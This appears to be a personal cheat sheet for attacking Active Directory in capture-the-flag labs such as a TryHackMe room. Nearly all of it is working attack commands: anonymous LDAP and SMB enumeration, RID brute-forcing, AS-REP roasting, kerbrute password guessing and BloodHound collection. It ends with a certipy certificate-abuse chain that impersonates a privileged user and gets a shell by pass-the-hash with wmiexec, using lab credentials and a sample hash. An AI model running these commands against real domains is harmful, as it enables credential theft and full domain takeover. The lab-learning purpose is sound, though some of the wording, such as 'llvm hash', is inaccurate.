# AD Exploitation Guide

This is a limited guide; AD exploitation is a vast topic. But the path of attack starts narrow and expands. When approaching a AD environment, say if you are just starting with an IP address and have done a scan showing the thousands of ports that an domain computer, especially a CA (which we will assume is the default case for a small CTF) then what is the next step?

Sources:
- the ledger THM room https://tryhackme.com/room/ledger
- https://notes.incendium.rocks/pentesting-notes/windows-pentesting/enumerating-users-no-credentials
- https://wadcoms.github.io/ (often the command syntax is out of date / in valid)

## 0. Enumerating AD - getting distinguished names etc

- `enum4linux -a 10.10.128.189` is an old staple, but seems only partially functional these days
- `nmap -n -sV --script "ldap* and not brute" -p 389 10.10.128.189` will return a bunch of info, importantly including distinguished names
- `ldapsearch -x -h 10.10.128.189 -b "dc=thm,dc=local"` using a name space from the above (here `dc=thm,dc=local`). Super finicky, and might not work at all. If it does work, its efficacy will depend on the namespace (query?) you use so maybe try different combinations. Can produce a tonne of data.

## 1. Find a user

- You might be lucky and some info is on a website, or in a public share, ftp etc.
- If not, try sid iteration: this iterates through the predictable SID/RID range of a domain, looking for users:
    - `python3.9 /opt/impacket/examples/lookupsid.py thm/anon@labyrinth.thm.local` using an anonymous user (requires finding the domain name and host name)
    - `crackmapexec smb labyrinth.thm.local -u anonymous -p "" --rid-brute 10000`. On the attack box, crackmapexec can be installed with `snap install crackmapexec`

## 2. Finding a password

- If you are lucky, one of the earlier enumeration searches might contain data. For example often in CTF contexts, its been the case that something like `Please change it: CHANGEME2023!` is in the description of a user (e.g. in the ledger room this was the case), using the data from something like ldapsearch
- If you have a list of uses, look for asrep roastable tokens with `python3.9 /opt/impacket/examples/GetNPUsers.py THM/ -usersfile users.txt -dc-ip 10.10.128.189 -format hashcat -outputfile hashes`. These can be cracked with `-m 18200`
- All else failing, you can try bruting a user account with `./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman`. Note kerbrute has a linux version and windows: https://github.com/ropnop/kerbrute. It can be used for some of the earlier steps, and password spraying, but I've never had much success.

## 3. Credentialed enumeration

With a username/password combo, the path forward opens up. I generally do two things, small then large:

- get a proper domain dump, complete with browsable html files using `python3.9 ldapdomaindump.py 10.10.128.189 -u THM\\IVY_WILLIS -p CHANGEME2023!`. This is much easier to navigate than raw LDAP output, and can help for seeing user groups and other notes dotted around.
- get a bloodhound dump - done remotely with python, you can avoid defender problems: `bloodhound-python -d thm.local -v --zip -c All -u IVY_WILLIS -p 'CHANGEME2023!' --dns-tcp -ns 10.10.128.189`.

## Escalation Special paths

TODO, an expandable section. Really there is almost no limit here. SPNs should be done when next encountered

- Exploiting misconfigured certs:
  - `python3.9 -m pip install certipy-ad`
  - use creds to find misconfigured certs `certipy find -u SUSANNA_MCKNIGHT@local.thm -p 'CHANGEME2023!' -dc-ip 10.10.128.189 -vulnerable`
  - if found enroll a vulnerable cert for a target, high priv user: `certipy req -username SUSANNA_MCKNIGHT  -password 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn bradley_ortiz@thm.local -dc-ip 10.10.128.189 -debug`
  - then use that cert to create a llvm hash: `certipy auth -pfx bradley_ortiz.pfx -dc-ip 10.10.128.189 -debug`
  - finally with those hashes, gain access. Evil-winrm is an option (might be deprecated), but impackets wmi-exec works well too: `python3.9 /opt/impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:16ec31963c93240962b7e60fd97b495d thm.local/bradley_ortiz@10.10.128.189`
